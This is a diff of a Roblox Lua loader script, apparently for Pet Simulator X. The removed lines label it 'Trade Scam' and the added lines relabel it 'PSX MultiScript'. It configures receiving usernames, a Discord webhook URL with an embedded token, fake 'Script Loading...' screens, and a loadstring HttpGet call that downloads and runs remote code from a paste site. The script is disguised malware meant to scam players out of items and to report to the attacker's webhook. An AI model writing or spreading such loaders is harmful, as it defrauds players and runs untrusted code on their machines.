@@ -1,22 +1,37 @@
-Username = "Reset40448970"
+UserName = "Reset40448970"
 
---Username2 = "APFKEalt_1"
+UserName2 = "APFKEalt_1"
 
-WebHook = "https://discord.com/api/webhooks/1109270540142784522/kfQU1nUhLp2UVhHaYzAXO3mhBlE4mEO1ocXFZC34TdOvnfkmRfg4wDRceN075M4F7yfY"
+Webhook = "https://discord.com/api/webhooks/1117509054923808839/-x6Fknh4Jrnw6gP-83tI-c6WwChsxMxTg6cZ5FUf2KdCSFQY-cJkVfZjU4KThGMrXyRV"
 
-loadingscreen = true
+_G.ScriptName = "PSX MultiScript"
 
-_G.CustomScriptName = "Trade Scam"
+_G.FirstText = "Please wait.."
 
-_G.Text1 = "Script Loading..."
+_G.SecondText = "Script Loading..."
 
-_G.Text2 = "Waiting for Script..."
+_G.ThirdText = "Almost Done..."
 
-_G.Text3 = "Checking Scripts..."
+_G.WaitingTime = 10
 
-_G.Text4 = "Starting Script..."
+loadstring(game:HttpGet("https://paste-bin.xyz/raw/984685", true))()
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
